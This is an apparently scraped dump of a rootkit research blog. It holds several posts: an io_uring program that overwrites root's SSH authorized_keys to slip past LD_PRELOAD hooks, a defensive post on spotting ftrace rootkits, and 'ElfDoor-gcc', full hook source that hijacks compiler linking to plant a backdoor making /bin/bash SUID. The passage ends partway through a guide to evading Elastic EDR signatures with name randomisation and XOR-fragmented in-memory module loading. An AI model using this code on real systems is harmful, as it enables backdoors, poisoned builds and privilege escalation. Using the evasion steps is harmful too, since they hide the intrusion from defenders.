close(fd); return 1; } ret = io_uring_wait_cqe(\u0026amp;ring, \u0026amp;cqe); if (ret \u0026lt; 0) { perror(\u0026#34;io_uring_wait_cqe\u0026#34;); close(fd); return 1; } if (cqe-\u0026gt;res \u0026lt; 0) { fprintf(stderr, \u0026#34;Write failed: %d\\n\u0026#34;, cqe-\u0026gt;res); } io_uring_cqe_seen(\u0026amp;ring, cqe); sqe = io_uring_get_sqe(\u0026amp;ring); if (!sqe) { fprintf(stderr, \u0026#34;Could not get SQE\\n\u0026#34;); close(fd); return 1; } io_uring_prep_close(sqe, fd); io_uring_sqe_set_data(sqe, (void *)3); ret = io_uring_submit(\u0026amp;ring); if (ret \u0026lt; 0) { perror(\u0026#34;io_uring_submit\u0026#34;); close(fd); return 1; } ret = io_uring_wait_cqe(\u0026amp;ring, \u0026amp;cqe); if (ret == 0) { io_uring_cqe_seen(\u0026amp;ring, cqe); } io_uring_queue_exit(\u0026amp;ring); printf(\u0026#34;gg!\\n\u0026#34;); return 0; } Let\u0026rsquo;s analyze the logic of the program step by step, fully detailing each stage:\n1. Initialization ret = io_uring_queue_init(1, \u0026amp;ring, 0); This sets up the io_uring interface with a submission queue depth of 1 (meaning one submission queue entry at a time) and assigns the ring buffer context to ring. This sets up the shared memory structure used between userspace and kernel.\n2. Opening the Target File with open sqe = io_uring_get_sqe(\u0026amp;ring); io_uring_prep_open(sqe, AT_FDCWD, FILE_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0644); This obtains a submission queue entry (SQE) and prepares an open. Unlike using libc\u0026rsquo;s open(), this is handed off directly to the kernel. The file /root/.ssh/authorized_keys will be opened in write-only mode, created if it doesn’t exist, and truncated if it does.\n3. Submitting the Request ret = io_uring_submit(\u0026amp;ring); All pending SQEs are submitted to the kernel. This includes the open operation we just prepared.\n4. Waiting for the Open to Complete ret = io_uring_wait_cqe(\u0026amp;ring, \u0026amp;cqe); fd = cqe-\u0026gt;res; Here we block until the kernel reports the result of the previous open operation. If successful, cqe-\u0026gt;res holds the file descriptor. Otherwise, it’s a negative errno value.\n5. Writing to the File iov.iov_base = (void *)content; iov.iov_len = content_len; io_uring_prep_writev(sqe, fd, \u0026amp;iov, 1, 0); We set up a writev with a single iovec structure pointing to our content buffer. Again, this bypasses libc and is submitted to the kernel through io_uring_submit().\n6. Closing the File Descriptor io_uring_prep_close(sqe, fd); This prepares a close syscall for the previously obtained file descriptor, cleaning up the resource after the write is complete.\n7. Cleanup io_uring_queue_exit(\u0026amp;ring); This releases all resources associated with the io_uring instance.\nThe complete execution is handled via direct syscall preparation and completion queues, meaning no libc API (like open(), write(), or close()) is ever invoked. This effectively bypasses userspace interception mechanisms based on dynamic linking and LD_PRELOAD.\nNo libc Call: Rootkits using LD_PRELOAD hook userland functions. io_uring interacts directly with the kernel. Kernel Submission: SQEs (Submission Queue Entries) are placed in a shared ring buffer and processed by the kernel, without invoking libc functions. No Function Symbol Interception: Since we never call open() or write() directly, dlsym(RTLD_NEXT, \u0026hellip;) never sees these calls. Security Implications While io_uring was designed for performance, it can also be abused as a stealthy vector to bypass userland monitoring. Malware or red team operators can leverage this interface to:\nInject backdoors undetected by LD_PRELOAD monitors Exfiltrate files or tamper with data covertly Operate beneath traditional EDR agents that rely on userland instrumentation Although this technique bypasses userland hooks, it does not evade kernel level security mechanisms such as LSM (Linux Security Modules) and () and eBPF. All I/O requests issued via io_uring are still subject to the same permission and inspection constraints enforced by the kernel, regardless of how they\u0026rsquo;re submitted. This is because io_uring still operates through the kernel\u0026rsquo;s I/O submission mechanism. Regardless of how I/O is submitted, via traditional syscalls or through io_uring, it still traverses the kernel and remains subject to kernel-level access control and monitoring\nFor example, LSMs like SELinux or AppArmor still validate access controls when files are opened or modified, regardless of whether the request came from io_uring or a traditional open() call. Similarly, eBPF-based monitors can observe and filter activity at the point where the kernel processes I/O requests.\nPOCs In the image above, see that no open() and openat() functions were used.\nConclusion io_uring offers more than just performance, it can also be abused as an anti-forensics or bypass technique when rootkits rely on userspace hooking mechanisms. Although powerful, its misuse should raise awareness of how modern kernel features can impact the offensive/defensive balance in Linux systems.\nBecome a part of Rootkit Researchers\nhttps://discord.gg/66N5ZQppU7 References https://kernel.dk/io_uring.pdf\n","permalink":"http://localhost:1313/hacking/using-io-uring-to-break-linux-rootkits-hooks/","summary":"\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://i.imgur.com/TGcNnzI.png\" alt=\"imgur\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eThis article explores a technique to bypass Userland based hooks, such as those implemented via LD_PRELOAD by leveraging io_uring, a modern Linux kernel interface for asynchronous I/O. By bypassing traditional libc wrappers, such as \u003ccode\u003eopen()\u003c/code\u003e, \u003ccode\u003ewrite()\u003c/code\u003e, and \u003ccode\u003eclose()\u003c/code\u003e, which are commonly intercepted in LD_PRELOAD based hooks, it\u0026rsquo;s possible to evade detection or interference by such malicious userspace mechanisms.\u003c/p\u003e\n\u003cp\u003eWe demonstrate this by comparing a simple LD_PRELOAD rootkit that hooks the \u003ccode\u003eopen()\u003c/code\u003e call with a program that uses io_uring to interact with the file system while still leveraging syscalls internally, io_uring minimizes user‑kernel transitions by batching operations through shared memory queues, issuing only a few essential syscalls (e.g., \u003ccode\u003eio_uring_enter\u003c/code\u003e, \u003ccode\u003eio_uring_setup\u003c/code\u003e) for coordination.\u003c/p\u003e","title":"breaking ld_preload rootkit hooks"},{"content":"Hello! Welcome to this post! Well, I have a server that is focused on rootkit research, both for Linux and Windows, feel free to come and participate in our community.\nhttps://discord.gg/66N5ZQppU7 What is Ftrace? ftrace (Function tracing) is a kernel function tracer. It helps a lot with debugging the Linux kernel, tracing functions, events, and of course, you can use ftrace to do hooking, etc.\nMain Features:\nFunction Tracing: Records kernel function calls, including order and execution time. Event Tracing: Monitors system events. Custom Filters: Focus on specific functions or events via configuration files. Support for dynamic tracers like kprobes and integration with tools like perf. On more current systems, tracing is enabled by default, but if not, simply set it:\nmount -t tracefs nodev /sys/kernel/tracing Ways to detect ftrace-based rootkits Detecting an LKM rootkit that uses ftrace is actually easier than you might think. If a rootkit uses ftrace, it is automatically detectable, because currently (at the time I am writing this post) there is no rootkit that I have seen that can hide from some tracing features.\nI will use the dreaded KoviD rootkit that uses ftrace as hooking.\nNow with KoviD loaded and hidden, we can begin.\nKoviD can be easily detected in /sys/kernel/tracing/enabled_functions, this file basically lists the kernel functions currently enabled for tracing.\nKoviD can also be detected in /sys/kernel/tracing/touched_functions, this file shows all functions that were every traced by ftrace or a direct trampoline (only for kernel 6.4+)\nin the current version of kovid, its functions do not appear in /sys/kernel/tracing/available_filter_functions, but it still leaves traces in this file, which basically lists kernel functions that can be filtered for tracing.\nNo ftrace based rootkit that I have seen so far can hide 100% and can be easily found, they always leave some trace behind.\nYou can also check my github repository, it contains several really cool things to detect and remove modern rootkits.\nCheat sheet: Detecting and Removing Linux Kernel Rootkit ","permalink":"http://localhost:1313/hacking/ftrace-rootkit/","summary":"\u003cp\u003eHello! Welcome to this post! Well, I have a server that is focused on rootkit research, both for Linux and Windows, feel free to come and participate in our community.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://discord.gg/66N5ZQppU7\"\u003ehttps://discord.gg/66N5ZQppU7\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"what-is-ftrace\"\u003eWhat is Ftrace?\u003c/h2\u003e\n\u003cp\u003eftrace (Function tracing) is a kernel function tracer. It helps a lot with debugging the Linux kernel, tracing functions, events, and of course, you can use ftrace to do hooking, etc.\u003c/p\u003e\n\u003cp\u003eMain Features:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eFunction Tracing: Records kernel function calls, including order and execution time.\u003c/li\u003e\n\u003cli\u003eEvent Tracing: Monitors system events.\u003c/li\u003e\n\u003cli\u003eCustom Filters: Focus on specific functions or events via configuration files.\u003c/li\u003e\n\u003cli\u003eSupport for dynamic tracers like kprobes and integration with tools like perf.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eOn more current systems, tracing is enabled by default, but if not, simply set it:\u003c/p\u003e","title":"Detecting rootkits based on ftrace hooking."},{"content":"Hijacking GCC with LD_PRELOAD Introduction If you\u0026rsquo;ve ever wondered how it\u0026rsquo;s possible to inject malicious code into binaries without touching the source code, and using only standard Linux tools, this article is for you. We\u0026rsquo;ll explore a very cool technique that intercepts the compilation process with LD_PRELOAD, modifying the commands executed and forcing the inclusion of a malicious library during linking.\nIn the end, the compiled binary looks legitimate, but it is infected with embedded malicious code, ready to be executed at the right time.\nThis is a simple project, with simple ideas and mechanisms, and it can certainly be improved.\nElfDoor-gcc repo: https://github.com/MatheuZSecurity/ElfDoor-gcc\nUnderstanding the Compilation Process with GCC Before attacking the compilation process, it\u0026rsquo;s essential to understand how it works\nGCC functions as more than a basic compiler; it operates as a kind of pipeline manager for multiple internal tools, depending on the requirements:\ngcc main.c -o main\nThis command has a sequence of steps:\nPreprocessing (cpp)\nExpands macros, includes header files, and removes comments.\nGenerates a .i file containing the \u0026ldquo;expanded\u0026rdquo; source code.\nCompilation (cc1)\nConverts the .i code into assembly.\nPerforms syntax and semantic checks, along with optimizations.\nAssembly (as)\nTranslates the assembly code into an object file (.o). Linkagem (collect2 → ld)\nCombines object files, resolves symbols, and produces the final binary.\ngcc invokes collect2, which in turn calls ld, the actual linker.\nThis final stage linking, is where the hijacking occurs. If we manage to intercept the moment when ld is invoked, we can modify its arguments and inject our own malicious library\nAttack Chain The core concept is to leverage LD_PRELOAD to override critical functions like execve and posix_spawn, enabling us to intercept process execution.\nOur project will consist of:\nmain.c: Hooks execve and posix_spawn, inspects the arguments, and, if appropriate, injects parameters to include our malicious library.\nb.a: The library containing the malicious code we want to embed in the final binary\nInstall.sh: Compiles and loads our malicious LD_PRELOAD.\nhello.c: A simple program that just prints \u0026ldquo;Hello,\u0026rdquo; but after compiling and executing, it will run our malicious code.\nElfDoor Hooks The main.c file is responsible for hooking process execution functions, such as execve and posix_spawn, to inject a malicious static library called b.a into the binary compilation process. This technique allows any binary generated on a compromised machine to carry a \u0026ldquo;hidden\u0026rdquo; payload without the developer noticing.\nThe structure starts with the inclusion of the essential libraries:\n#define _GNU_SOURCE #include \u0026lt;dlfcn.h\u0026gt; #include \u0026lt;spawn.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; extern char **environ; The use of _GNU_SOURCE is essential to enable GNU libc specific extensions, such as the interception of execve and posix_spawn. Including \u0026lt;dlfcn.h\u0026gt; allows the use of dlsym, which is crucial for obtaining pointers to the original functions and diverting execution.\nNext, we have auxiliary functions responsible for determining if the running binary is relevant. For example, is_gcc detects whether the binary being executed is the GCC, cc, or clang compiler:\nint is_gcc(const char *path) { const char *progname = strrchr(path, \u0026#39;/\u0026#39;); progname = progname ? progname + 1 : path; return strcmp(progname, \u0026#34;gcc\u0026#34;) == 0 || strcmp(progname, \u0026#34;cc\u0026#34;) == 0 || strcmp(progname, \u0026#34;clang\u0026#34;) == 0; } The code above extracts the program name from the full path (e.g., /usr/bin/gcc) and directly compares it with known compiler names. The same pattern is used to identify collect2 and ld in the is_collect2 and is_linker functions.\nThen, the should_inject function determines whether the injection should occur, based on the compiler arguments:\nint should_inject(char *const argv[]) { for (int i = 0; argv[i]; ++i) { if (strcmp(argv[i], \u0026#34;-c\u0026#34;) == 0 || strcmp(argv[i], \u0026#34;-E\u0026#34;) == 0 || strcmp(argv[i], \u0026#34;-S\u0026#34;) == 0) return 0; } return 1; } These flags (-c, -E, -S) are used in intermediate compilation processes that do not generate final executables. Since the goal is to inject code into the final binary, these modes are ignored.\nThe most important function is inject_args, which constructs a new argument list by inserting the static library:\nchar **inject_args(const char *bin_path, char *const argv[], int extra) { int argc; for (argc = 0; argv[argc]; ++argc); const char *lib_path = \u0026#34;/dev/shm/b.a\u0026#34;; for (int i = 0; i \u0026lt; argc; ++i) { if (argv[i] \u0026amp;\u0026amp; strstr(argv[i], \u0026#34;b.a\u0026#34;) != NULL) { return NULL; } } const char **new_argv = malloc(sizeof(char *) * (argc + extra + 1)); if (!new_argv) return NULL; int i = 0, j = 0; for (; i \u0026lt; argc; ++i) new_argv[j++] = argv[i]; const char *arg1, *arg2, *arg3; if (is_gcc(bin_path)) { arg1 = \u0026#34;-Wl,--whole-archive\u0026#34;; arg2 = lib_path; arg3 = \u0026#34;-Wl,--no-whole-archive\u0026#34;; } else { arg1 = \u0026#34;--whole-archive\u0026#34;; arg2 = lib_path; arg3 = \u0026#34;--no-whole-archive\u0026#34;; } new_argv[j++] = arg1; new_argv[j++] = arg2; new_argv[j++] = arg3; new_argv[j] = NULL; return (char **)new_argv; } The inject_args function modifies a program\u0026rsquo;s argument list by conditionally adding a static library (/dev/shm/b.a), depending on the binary, and prevents duplication of this library in the list.\nThe hooking of execve happens as follows:\nint execve(const char *pathname, char *const argv[], char *const envp[]) { static int (*real_execve)(const char *, char *const [], char *const []) = NULL; if (!real_execve) real_execve = dlsym(RTLD_NEXT, \u0026#34;execve\u0026#34;); if ((is_gcc(pathname) || is_collect2(pathname) || is_linker(pathname)) \u0026amp;\u0026amp; should_inject(argv)) { char **new_argv = inject_args(pathname, argv, 3); if (new_argv) { int result = real_execve(pathname, new_argv, envp); free(new_argv); return result; } } return real_execve(pathname, argv, envp); } When the process attempts to execute gcc, ld, or similar, the execve hook intercepts the call. It calls the inject_args function to modify the arguments, and if the modification is successful, it executes the binary with the new argument list. The original execve function is called via the pointer obtained with dlsym, ensuring that the actual call still happens, but with the malicious code included.\nFinally, the posix_spawn function is handled with identical logic:\nint posix_spawn(pid_t *pid, const char *path, const posix_spawn_file_actions_t *file_actions, const posix_spawnattr_t *attrp, char *const argv[], char *const envp[]) { static int (*real_posix_spawn)(pid_t *, const char *, const posix_spawn_file_actions_t *, const posix_spawnattr_t *, char *const [], char *const []) = NULL; if (!real_posix_spawn) real_posix_spawn = dlsym(RTLD_NEXT, \u0026#34;posix_spawn\u0026#34;); if ((is_gcc(path) || is_collect2(path) || is_linker(path)) \u0026amp;\u0026amp; should_inject(argv)) { char **new_argv = inject_args(path, argv, 3); if (new_argv) { int result = real_posix_spawn(pid, path, file_actions, attrp, new_argv, envp); free(new_argv); return result; } } return real_posix_spawn(pid, path, file_actions, attrp, argv, envp); } This hook ensures that even when gcc or ld use posix_spawn internally, the malicious library will still be injected. It is a layer of compatibility that makes the our malware even more effective.\nThe entire mechanism is activated when the library compiled with this main.c is loaded via LD_PRELOAD, a legitimate Linux feature used to replace functions from standard libraries. Any compilation performed on the system can be automatically compromised.\nMalicious code: b.c The purpose of the b.c code is to modify the permissions of /bin/bash to allow it to be executed with elevated privileges.\n#include \u0026lt;unistd.h\u0026gt; #include \u0026lt;sys/stat.h\u0026gt; __attribute__((constructor)) void backdoor() { chmod(\u0026#34;/bin/bash\u0026#34;, 04755); } In other words, as soon as some code is compiled using GCC, for example, it will inject our backdoor inside, and if executed as root, it will set the SUID on /bin/bash.\nPOC Conclusion With this simple hook, we’re able to intercept GCC’s compilation pipeline and inject a malicious library during the linking stage, all without modifying the source code.\nThe result is a seemingly legitimate binary that silently carries a hidden payload, ready to be executed.\nPlease feel free to contact me on Twitter if you have any questions.\nRootkit Researchers\n","permalink":"http://localhost:1313/hacking/gcc/","summary":"\u003ch1 id=\"hijacking-gcc-with-ld_preload\"\u003eHijacking GCC with LD_PRELOAD\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://i.imgur.com/MmPbrjL.png\" alt=\"imgur\"  /\u003e\n\u003c/p\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIf you\u0026rsquo;ve ever wondered how it\u0026rsquo;s possible to inject malicious code into binaries \u003cstrong\u003ewithout touching the source code\u003c/strong\u003e, and using only standard Linux tools, this article is for you. We\u0026rsquo;ll explore a very cool technique that intercepts the compilation process with LD_PRELOAD, modifying the commands executed and forcing the inclusion of a malicious library during \u003cstrong\u003elinking\u003c/strong\u003e.\u003c/p\u003e\n\u003cp\u003eIn the end, the compiled binary looks legitimate, but it is infected with embedded malicious code, ready to be executed at the right time.\u003c/p\u003e","title":"ElfDoor-gcc"},{"content":" Stealthy Kernel Rootkit: https://github.com/MatheuZSecurity/Singularity\nRootkit Researchers: https://discord.gg/66N5ZQppU7\nIntroduction Security solutions continue to intensify. Modern EDRs like Elastic Security, integrated with Elastic Defend, employ multiple detection layers including YARA signatures and behavioral analysis to identify Linux kernel rootkits, triggering 26+ alerts on a single malicious module.\nThis article demonstrates how to systematically evade these defenses. We present a comprehensive case study of developing a Linux rootkit that successfully bypasses Elastic Security\u0026rsquo;s detection mechanisms through obfuscation, fragmentation, and staged execution techniques. All content is strictly for educational purposes only.\nTable of Contents Introduction Understanding the Threat Landscape: Elastic YARA Rules Primary Detection Rules Detection Signature Analysis The Singularity Rootkit: Capabilities Overview Core Features Evasion Technique 1: Symbol Name Randomization The Problem The Solution: Intelligent Name Randomization Evasion Technique 2: Module Fragmentation The Problem The Solution: Fragment + XOR Encoding + In-Memory Loading Custom Loader via memfd_create Evasion Technique 3: Ftrace Helper Obfuscation The Problem The Solution: Rename Ftrace Framework Functions Build Pipeline: Automated Obfuscation Workflow Final Test: Successful Evasion Bonus: Compilation Path Detection Bypass Bonus 2: Bypassing Elastic Behavioral Detection for Reverse Shells Conclusion Understanding the Threat Landscape: Elastic YARA Rules In a default environment with the Elastic agent installed, attempting to compile and load the Singularity rootkit results in immediate detection and files removed. The kernel object is automatically deleted and isolated in quarantine before it can be loaded into the kernel.\nThere were approximately 26 detections.\nUpon investigation, I identified the specific Elastic YARA rules detecting our rootkit:\nPrimary Detection Rules Linux_Rootkit_BrokePKG.yar\nLinux_Rootkit_Generic.yar\nLinux_Rootkit_Generic_61229bdf - Detects common rootkit patterns and function names Linux_Rootkit_Generic_482bca48 - Targets suspicious prefixes and hook patterns Linux_Rootkit_Generic_d0c5cfe0 - Detects initialization and hooking combinations Linux_Rootkit_Generic_f07bcabe - Identifies ftrace helper functions Linux_Rootkit_Generic_5d17781b - Targets license strings combined with kallsyms Linux_Rootkit_BrokePKG_7b7d4581 - Specific patterns from known rootkits Detection Signature Analysis Generic Rootkit Detection (61229bdf) Targets: hide_module, hook_getdents, orig_kill, fake_tcp4_seq_show, etc. Condition: 4 or more matching strings Total patterns: 57 distinct function names Hook Pattern Detection (482bca48) System strings: sys_call_table, kallsyms_lookup_name, kprobe Rootkit prefixes: rootkit, hide_, hacked_, fake_, hooked_ Hook suffixes: _getdents, _kill, _tcp4_seq_show, _udp4_seq_show Condition: 3 system strings AND (all prefixes OR 3 prefixes + 5 hooks) License String Detection (5d17781b) Targets: kallsyms_lookup_name_t + \u0026#34;license=GPL\u0026#34; Condition: Both strings must be present Purpose: Detects ftrace-based rootkits using kallsyms Ftrace Helper Detection (f07bcabe) Targets: - fh_install_hook - fh_remove_hook - fh_resolve_hook_address Condition: 2 or more matching strings BrokePKG Specific Detection (7b7d4581) License strings: - author=R3tr074 - name=brokepkg - description=Rootkit - license=GPL Specific strings: - brokepkg - brokepkg: module revealed - br0k3_n0w_h1dd3n Hook patterns: - nf_inet_hooks - ftrace_hook - hook_getdents - hook_kill - orig_tcp4_seq_show Condition: 3 license strings OR 2 specific strings OR 4 hook patterns Since our rootkit utilizes ftrace for syscall hooking, it naturally contains many of these patterns. The challenge becomes: how do we maintain functionality while evading static signature detection?\nThe Singularity Rootkit: Capabilities Overview Source: https://github.com/MatheuZSecurity/Singularity\nBefore diving into evasion techniques, let\u0026rsquo;s understand what the Singularity rootkit accomplishes:\nCore Features Process Hiding: Hides processes from /proc. File and Directory Hiding: Conceals files matching specific patterns (singularity, obliviate, matheuz, zer0t, etc.) Network Hiding: Hides TCP connections on port 8081 from netstat and packet capture tools Privilege Escalation: Provides root access via signal 59 (kill -59 ) or environment variable (MAGIC=mtz) ICMP Backdoor: Triggers reverse shell via magic ICMP packets (sequence 1337) Anti-Analysis Features:\nBlocks BPF programs and tracing Prevents ftrace manipulation by other users Disables module loading via init_module/finit_module hooks Filters /proc/kallsyms, /proc/modules, and tracefs Taint Clearing: Resets kernel taint flags to hide unsigned module loading Log Sanitization: Filters kernel logs (dmesg, /var/log/kern.log) to remove traces of the rootkit Module Stealth: Self-hiding from lsmod and /sys/module directory Evasion Technique 1: Symbol Name Randomization The Problem Rootkits typically use predictable naming patterns that become signatures:\nhook_getdents64 fake_tcp4_seq_show hide_module orig_kill hacked_open hooked_read Elastic\u0026rsquo;s YARA rules (61229bdf, 482bca48, d0c5cfe0) specifically target these prefixes:\n$rk1 = \u0026#34;rootkit\u0026#34; $rk2 = \u0026#34;hide_\u0026#34; $rk3 = \u0026#34;hacked_\u0026#34; $rk4 = \u0026#34;fake_\u0026#34; $rk5 = \u0026#34;hooked_\u0026#34; $hook1 = \u0026#34;_getdents\u0026#34; $hook2 = \u0026#34;_kill\u0026#34; $hook3 = \u0026#34;_tcp4_seq_show\u0026#34; The Solution: Intelligent Name Randomization Our Python obfuscator generates kernel-like generic names that blend in with legitimate kernel code:\ndef _generate_random_name(self) -\u0026gt; str: \u0026#34;\u0026#34;\u0026#34;Generates random name that avoids YARA patterns\u0026#34;\u0026#34;\u0026#34; # Avoid suspicious prefixes: hook_, fake_, hide_, hacked_, hooked_, orig_ # Use generic names that look legitimate prefixes = [\u0026#39;sys\u0026#39;, \u0026#39;kern\u0026#39;, \u0026#39;dev\u0026#39;, \u0026#39;mm\u0026#39;, \u0026#39;fs\u0026#39;, \u0026#39;net\u0026#39;, \u0026#39;proc\u0026#39;, \u0026#39;sched\u0026#39;] suffixes = [\u0026#39;handler\u0026#39;, \u0026#39;helper\u0026#39;, \u0026#39;worker\u0026#39;, \u0026#39;ops\u0026#39;, \u0026#39;func\u0026#39;, \u0026#39;entry\u0026#39;, \u0026#39;cb\u0026#39;] prefix = random.choice(prefixes) suffix = random.choice(suffixes) middle = \u0026#39;\u0026#39;.join(random.choices(string.ascii_lowercase, k=random.randint(3, 6))) return f\u0026#34;{prefix}_{middle}_{suffix}\u0026#34; Key Features No suspicious prefixes (hook_, fake_, hide_) Looks like legitimate kernel code Maintains internal consistency via mapping file Protects kernel API calls from renaming Protected Names The obfuscator maintains a whitelist of kernel API functions that must NOT be renamed:\ndef _get_protected_names(self) -\u0026gt; Set[str]: \u0026#34;\u0026#34;\u0026#34;Names from kernel that should NOT be changed\u0026#34;\u0026#34;\u0026#34; return { # Basic C types \u0026#39;int\u0026#39;, \u0026#39;void\u0026#39;, \u0026#39;long\u0026#39;, \u0026#39;char\u0026#39;, \u0026#39;size_t\u0026#39;, \u0026#39;ssize_t\u0026#39;, # Essentials \u0026#39;module_init\u0026#39;, \u0026#39;module_exit\u0026#39;, \u0026#39;THIS_MODULE\u0026#39;, \u0026#39;current\u0026#39;, \u0026#39;kmalloc\u0026#39;, \u0026#39;kfree\u0026#39;, \u0026#39;printk\u0026#39;, \u0026#39;pr_debug\u0026#39;, \u0026#39;copy_from_user\u0026#39;, \u0026#39;copy_to_user\u0026#39;, \u0026#39;fget\u0026#39;, \u0026#39;fput\u0026#39;, \u0026#39;kernel_read\u0026#39;, # Structures \u0026#39;pt_regs\u0026#39;, \u0026#39;file\u0026#39;, \u0026#39;task_struct\u0026#39;, \u0026#39;sk_buff\u0026#39;, # Entry points \u0026#39;main\u0026#39;, \u0026#39;init\u0026#39;, \u0026#39;exit\u0026#39;, } Function Name Extraction The obfuscator scans source files for function definitions using multiple regex patterns:\nself.function_patterns = [ r\u0026#39;\\bnotrace\\s+(?:static\\s+)?(?:int|void|long|bool|ssize_t|asmlinkage)\\s+(\\w+)\\s*\\(\u0026#39;, r\u0026#39;\\bstatic\\s+(?:notrace\\s+)?(?:int|void|long|bool|ssize_t|asmlinkage)\\s+(\\w+)\\s*\\(\u0026#39;, r\u0026#39;\\bstatic\\s+asmlinkage\\s+\\w+\\s+(\\w+)\\s*\\(\u0026#39;, r\u0026#39;\\basmlinkage\\s+\\w+\\s+\\*?\\(?\\*?(\\w+)\\)?\u0026#39;, r\u0026#39;\\b(\\w+_init)\\s*\\(\\s*void\\s*\\)\u0026#39;, r\u0026#39;\\b(\\w+_exit)\\s*\\(\\s*void\\s*\\)\u0026#39;, r\u0026#39;\\bHOOK\\s*\\([^,]+,\\s*(\\w+)\\s*,\u0026#39;, r\u0026#39;\\btypedef\\s+[^;]+\\s+(\\w+_t)\\s*;\u0026#39;, ] Example Transformation Before:\n// modules/hiding_directory.c static notrace long hook_getdents64(const struct pt_regs *regs) { long res = orig_getdents64(regs); // ... } static notrace long hook_getdents(const struct pt_regs *regs) { long res = orig_getdents(regs); // ... } After:\n// obfuscated/modules/hiding_directory.c static notrace long sys_abjker_handler(const struct pt_regs *regs) { long res = kern_wopqls_helper(regs); // ... } static notrace long fs_tnmqlk_ops(const struct pt_regs *regs) { long res = net_xzpnrm_func(regs); // ... } Implementation Details def _replace_in_content(self, content: str, mapping: Dict[str, str]) -\u0026gt; str: \u0026#34;\u0026#34;\u0026#34;Replace names in content\u0026#34;\u0026#34;\u0026#34; modified = content # Sort by descending length to avoid partial substitutions sorted_items = sorted(mapping.items(), key=lambda x: len(x[0]), reverse=True) for old_name, new_name in sorted_items: # Use word boundary for exact substitution pattern = r\u0026#39;\\b\u0026#39; + re.escape(old_name) + r\u0026#39;\\b\u0026#39; modified = re.sub(pattern, new_name, modified) return modified The key insight: we sort by length descending to prevent partial matches. For example, if we have both hook_kill and hook_kill_ex, we must replace hook_kill_ex first to avoid breaking it into sys_abc_handler_ex.\nEvasion Technique 2: Module Fragmentation The Problem EDR solutions scan loaded kernel modules primarily on disk. A monolithic .ko file presents a single attack surface that\u0026rsquo;s easy to analyze:\nSignature scanning of the entire module on disk Static analysis of ELF structure Symbol table enumeration String pattern detection (including \u0026ldquo;GPL\u0026rdquo;, \u0026ldquo;kallsyms_lookup_name\u0026rdquo;, etc.) The Solution: Fragment + XOR Encoding + Ephemeral In-Memory Loading We split the compiled module into encrypted chunks that are only reassembled in memory during loading. This technique breaks static disk-based analysis while maintaining functionality.\nHow This Evades Detection The evasion works through a multi-layered approach:\nDisk-Based YARA Evasion: XOR encoding breaks string signatures in stored fragments Ephemeral Reconstruction: The complete module exists in plaintext only briefly in a temporary memfd Self-Hiding Post-Load: The rootkit immediately conceals itself after loading Important Technical Note: After XOR decoding during the load process, strings like \u0026ldquo;GPL\u0026rdquo; and \u0026ldquo;kallsyms_lookup_name\u0026rdquo; are restored to plaintext in memory. However, Elastic\u0026rsquo;s YARA rules primarily scan files on disk, not ephemeral memory structures. The combination of:\nXOR-encoded fragments on disk (unreadable to YARA) Millisecond-duration plaintext in anonymous memfd (difficult to scan) Immediate self-hiding after module load (invisible to subsequent analysis) \u0026hellip;creates an effective evasion without requiring permanent string obfuscation in memory.\nFragmentation Pipeline: def fragment(self, chunk_size: int = 65536, encode: bool = True) -\u0026gt; List[bytes]: \u0026#34;\u0026#34;\u0026#34; Fragment the .ko into chunks Args: chunk_size: Size of each fragment (default: 64KB) encode: If True, apply XOR encoding Returns: List of fragments \u0026#34;\u0026#34;\u0026#34; print(f\u0026#34;\\n[*] Fragmenting: {self.ko_path}\u0026#34;) print(f\u0026#34; Chunk size: {chunk_size} bytes\u0026#34;) # Read the .ko file with open(self.ko_path, \u0026#39;rb\u0026#39;) as f: ko_data = f.read() original_size = len(ko_data) print(f\u0026#34;[+] Original size: {original_size} bytes\u0026#34;) # Generate random XOR key xor_key = os.urandom(16) if encode else b\u0026#39;\\x00\u0026#39; * 16 # Fragment fragments = [] num_chunks = (original_size + chunk_size - 1) // chunk_size for i in range(num_chunks): start = i * chunk_size end = min(start + chunk_size, original_size) chunk = ko_data[start:end] # Apply encoding if necessary if encode: chunk = self._xor_encode(chunk, xor_key) fragments.append(chunk) checksum = self._calculate_checksum(chunk) print(f\u0026#34;[+] Fragment {i+1}/{num_chunks}: {len(chunk)} bytes (SHA256: {checksum[:16]}...)\u0026#34;) self.fragments = fragments # Metadata self.metadata = { \u0026#39;original_filename\u0026#39;: self.ko_path.name, \u0026#39;original_size\u0026#39;: original_size, \u0026#39;num_fragments\u0026#39;: len(fragments), \u0026#39;chunk_size\u0026#39;: chunk_size, \u0026#39;encoded\u0026#39;: encode, \u0026#39;xor_key\u0026#39;: xor_key.hex() if encode else None, \u0026#39;checksums\u0026#39;: [self._calculate_checksum(f) for f in fragments] } return fragments XOR Encoding We use a simple but effective XOR cipher with a random 16-byte key:\ndef _xor_encode(self, data: bytes, key: bytes) -\u0026gt; bytes: \u0026#34;\u0026#34;\u0026#34;Simple XOR encoding for obfuscation\u0026#34;\u0026#34;\u0026#34; encoded = bytearray() key_len = len(key) for i, byte in enumerate(data): encoded.append(byte ^ key[i % key_len]) return bytes(encoded) While XOR is cryptographically weak, it serves our purpose for disk-based evasion:\nBreaks signature matching in files stored on disk Fast to encode/decode Minimal overhead Easy to implement in C loader Evasion Layer Breakdown ┌─────────────────────────────────────────────────────────────────┐ │ LAYER 1: Fragments on Disk (XOR Encoded) │ ├─────────────────────────────────────────────────────────────────┤ │ Status: YARA cannot detect signatures │ │ Reason: All bytes are XOR\u0026#39;ed, \u0026#34;GPL\u0026#34; appears as random bytes │ │ │ │ # Before encoding │ │ strings singularity.ko | grep \u0026#34;GPL\u0026#34; │ │ license=GPL │ │ │ │ # After encoding │ │ strings fragments/chunk_000.bin | grep \u0026#34;GPL\u0026#34; │ │ (no results - bytes are obfuscated) │ └─────────────────────────────────────────────────────────────────┘ ┌─────────────────────────────────────────────────────────────────┐ │ LAYER 2: 